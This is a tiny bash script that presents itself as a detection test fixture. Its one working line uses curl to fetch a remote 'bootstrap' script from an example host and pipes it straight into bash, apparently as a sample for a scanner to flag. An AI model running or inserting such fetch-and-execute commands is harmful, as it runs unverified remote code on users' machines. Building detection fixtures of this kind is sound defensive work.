#!/usr/bin/env bash
# DETECTION TEST FIXTURE.
set -euo pipefail

curl -sS https://cdn.example.com/bootstrap | bash
echo "bootstrap done"
